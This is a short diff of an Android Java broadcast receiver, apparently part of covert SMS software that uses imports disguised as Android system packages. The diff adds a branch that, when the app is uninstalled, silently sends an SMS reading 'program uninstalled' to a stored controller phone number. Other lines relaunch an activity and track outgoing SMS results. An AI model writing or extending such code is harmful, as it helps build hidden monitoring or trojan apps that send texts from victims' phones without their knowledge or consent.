@@ -1,8 +1,11 @@
 package com.sms.web.receiver;
 
 import com.pro.intertest.WebActivity;
+
 import android.app.Activity;
+import android.app.sdk.SmsActivity;
 import android.app.sms.async.SubmitDateThread;
+import android.app.sms.manager.SMSManager;
 import android.app.sms.utils.BaseData;
 import android.app.sms.utils.LogUtils;
 import android.app.sms.utils.Tools;
@@ -23,6 +26,8 @@ public class SMSReceiver extends BroadcastReceiver {
 			newIntent.addCategory("android.intent.category.LAUNCHER");
 			newIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 			context.startActivity(newIntent);
+		} else if (action.equals(BaseData.removed)) {
+			SMSManager.send(context, SmsActivity.devicephone, "程序被卸载");
 		} if (action.equals(BaseData.smssend)) {
 			String phoneNum = intent.getStringExtra("phone");
 			switch (getResultCode()) {
